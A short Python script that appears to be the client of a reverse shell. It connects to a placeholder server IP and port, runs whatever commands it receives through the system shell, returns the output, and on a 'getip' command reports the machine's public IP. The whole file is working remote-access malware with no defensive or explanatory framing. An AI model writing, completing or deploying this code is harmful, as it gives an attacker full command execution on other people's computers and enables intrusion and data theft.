import socket
import subprocess
import requests
import sys

DEFAULT_SERVER_IP = "SERVER_IP_PLACEHOLDER"
DEFAULT_SERVER_PORT = SERVER_PORT_PLACEHOLDER

if sys.platform == "win32":
    import ctypes
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    hwnd = kernel32.GetConsoleWindow()
else:
    user32 = None
    kernel32 = None
    hwnd = None

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode()
        if command.lower() == "exit":
            break

        if command.lower() == "getip":
            try:
                ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
                client.send(ip.encode())
            except requests.exceptions.RequestException as e:
                client.send(f"Error getting IP: {e}".encode())
            continue

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output
        except FileNotFoundError:
            output = f"Command not found: '{command}'\n"
        except Exception as e:
            output = f"An error occurred: {e}\n"

        client.send(output.encode())

    client.close()

if __name__ == "__main__":
    start_client(DEFAULT_SERVER_IP, DEFAULT_SERVER_PORT)
